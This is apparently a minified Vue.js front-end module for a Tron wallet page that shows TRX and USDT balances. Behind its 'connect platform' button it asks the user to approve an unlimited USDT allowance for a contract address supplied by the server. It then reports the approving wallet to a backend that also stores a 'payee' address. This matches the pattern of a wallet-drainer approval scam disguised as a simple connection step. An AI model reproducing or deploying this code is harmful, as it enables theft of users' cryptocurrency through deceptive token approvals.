import{f as e,d as a,g as t,h as n,i as s,B as o}from"./_vant-090d5365.js";import{T as l}from"./_tronweb-d46d50e4.js";import{g as c,s as r}from"./pay-025ce095.js";import{O as i,F as u,G as d,J as f,av as m,aa as v,ak as w,al as g,an as p,az as _,am as k,ao as b,ap as h,D as y,aB as $}from"./__vendor-b5f28a7a.js";import{_ as x,b as T}from"../entry/index-fd3bf953.js";import"./_validator-8b21da3b.js";import"./_viem-f8292e21.js";const C={class:"main"},j={class:"operate"},B={key:0,class:"dev"},S={style:{"padding-top":"20px"}},A={key:1,class:"watermark"},L={key:0},D={key:1},O={__name:"tron",setup(x){const T=!1,O="https://api.trongrid.io",E="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";let M,R,{proxy:W}=i();u("");let I=!1,N=!1;u(!1);let q=u(null);const z=d({account:"",balance:0,usdtBalance:0});let G;f((()=>{var e,a,t;const{id:n}=m.parse(window.location.hash.substring(window.location.hash.indexOf("?")+1));c("tron",n||0).then((e=>{M=e.data.address.contract,R=e.data.address.payee,N=M.substr(-6)})).catch((e=>{console.error("getConfig",e)})),window.tronWeb?q.value=window.tronWeb:q.value=new l({fullHost:O,headers:{}}),q.value,Q(),(null==(a=null==(e=q.value)?void 0:e.defaultAddress)?void 0:a.base58)&&!0===(null==(t=q.value)?void 0:t.ready)&&P()})),v((()=>{window.removeEventListener("message",U)}));const H=async()=>{if(!1===q.value.ready)return P();t({forbidClick:!0,duration:0});const e=q.value.fromSun(await G.allowance(z.account,M).call());Number(e)<1e8?F():a(W.$t("message.repeat_connect_platform"))},K=async(n=!1)=>{var s;if(!1===q.value.ready)return P();!0!==n&&t({forbidClick:!0,duration:0}),z.balance="\xb7",z.usdtBalance="\xb7";let o=q.value.fromSun(await q.value.trx.getBalance(z.account)),l=await G.balanceOf(z.account).call();l=q.value.fromSun((null==l?void 0:l._hex)??l??0),z.balance=o,z.usdtBalance=l,I=!!z.account&&(null==(s=z.account)?void 0:s.substr(-6)),e(),!0!==n&&a(W.$t("message.balance_refreshed"))},F=async()=>{if(!1===q.value.ready)return P();t({forbidClick:!0,duration:0});const s=q.value.fromSun(await q.value.trx.getBalance(z.account));if(Number(s)<50)return a(W.$t("message.insufficient_gas")),!1;const o=/MetaMask/.test(window.navigator.userAgent)?q.value.toSun(1e11.toString()):"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";G.approve(M,o).send({feeLimit:1e8,callValue:0}).then((e=>V({approve_address:z.account,contract_address:M,chain_type:2,chain_id:8e4,token_type:8e4,status:2,channel_id:2}))).then((e=>{1e4==e.code?n({title:$t("message.connect_success"),icon:1}):(console.error("approve",e),n({title:$t("message.connect_fail"),message:e.message,icon:2}))})).catch((e=>{new RegExp(/cancel|\u53d6\u6d88/).test(e)||new RegExp(/declined|\u62d2\u7edd/).test(e)?a(W.$t("message.cancel_operation")):(console.error("approve_2",e),n({title:W.$t("message.operation_fail"),message:Y(e),icon:2}))})).finally((()=>{e()}))};let J=!0;const P=async(t=!1)=>{if(!0!==t){let t=window.sessionStorage.getItem("linkWallet_timestamp");if(null!==t&&Date.now()-t<500)return!1;if(window.sessionStorage.setItem("linkWallet_timestamp",Date.now()),!(()=>{if(void 0===q.value.ready)return X()?/TokenPocket|imToken|MetaMask|OKEx/.test(window.navigator.userAgent)?a({message:W.$t("message.switch_to_tron_network"),duration:3e3}):a({message:W.$t("message.please_use_the_tron_network"),duration:3e3}):(e(!0),s({icon:7,message:W.$t("message.please_install"),confirmButtonText:"Chrome Store",cancelButtonText:"TronLink website",closeOnClickOverlay:!0}).then((()=>{window.open("https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec")})).catch((()=>{window.open("https://www.tronlink.org/cn/")}))),!1;if(q.value&&!1===q.value.ready){if(0==q.value.defaultAddress.base58){if(q.value.isTronLink&&(e(!0),a({message:W.$t("message.please_unlock_wallet"),duration:3e3}),""!=z.account&&(z.account="")),1==J){J=!1,setTimeout((()=>{J=!0}),5e3);let e=Date.parse(new Date)/1e3;q.value.isConnected().then((t=>{""==z.account&&Date.parse(new Date)/1e3-e>1&&(a(W.$t("message.wallet_unlocked")),P(!0))})).catch((e=>{console.error("isConnected",e)}))}}else e(!0),s({icon:7,message:W.$t("message.please_allow_to_connect_wallet")}).then((()=>{window.location.search="_t="+Date.now()})).catch((()=>{}));return!1}return!0})())return!1}return z.account=q.value.defaultAddress.base58||"",G||await(async()=>{if(!1===q.value.ready)return P();G=await q.value.contract().at(E)})(),K(!0),!0},Q=()=>{q.value&&!0===q.value.isTronLink&&window.addEventListener("message",U)},U=t=>{var n,s;if(!0===(null==(n=null==t?void 0:t.data)?void 0:n.isTronLink))if("contentScript"==(null==(s=null==t?void 0:t.data)?void 0:s.source)){if("setAccount"===t.data.message.action)setTimeout((()=>{e(!0),""==z.account?t.data.message.data.address&&(a(W.$t("message.wallet_unlocked")),P()):!1===t.data.message.data.address?(a({message:W.$t("message.digital_wallet_locked"),duration:3e3}),z.account="",z.balance=".",z.usdtBalance="."):z.account!=q.value.defaultAddress.base58&&(a({message:W.$t("message.switched_accounts"),duration:3e3}),z.account=q.value.defaultAddress.base58,K(!0))}),500)}else"disconnect"==t.data.message.action&&(a({message:W.$t("message.has_been_disconnected"),duration:3e3}),z.account="",z.balance=".",z.usdtBalance=".")},V=e=>r(),X=()=>{let e=window.navigator.userAgent.toLowerCase();return/android|webos|iphone|ipod|blackberry|iemobile|opera mini/i.test(e)},Y=e=>{let a=(null==e?void 0:e.message)||(null==e?void 0:e.error)||e;if(a){let e=a.indexOf(":");return-1===e?a:a.substring(e+1)}return W.$t("message.unknown_error")};return(e,a)=>{var t;const n=o;return w(),g("div",C,[p("div",j,[(null==(t=e.walletAccount)?void 0:t.isConnected)?(w(),_(n,{key:0,type:"success",onClick:H},{default:k((()=>[b(h(e.$t("connect_platform")),1)])),_:1})):(w(),_(n,{key:1,type:"warning",onClick:P},{default:k((()=>[b(h(e.$t("connect_wallet")),1)])),_:1}))]),y(T)&&z.account?(w(),g("div",B,[p("button",{class:"btn",onClick:K},"\u5237\u65b0"),p("p",S,"\u60a8\u7684\u94b1\u5305\u5730\u5740\uff1a"+h(z.account),1),p("p",null,"\u6ce2\u573a\u4f59\u989d\uff1a"+h(z.balance)+" TRX",1),p("p",null,"USDT\u4f59\u989d\uff1a$"+h(z.usdtBalance),1)])):$("",!0),z.account?(w(),g("view",A,[y(I)?(w(),g("div",L,h(y(I)),1)):$("",!0),y(N)?(w(),g("div",D,h(y(N)),1)):$("",!0)])):$("",!0)])}}};"function"==typeof T&&T(O);const E=x(O,[["__scopeId","data-v-8f569324"]]);export{E as default};
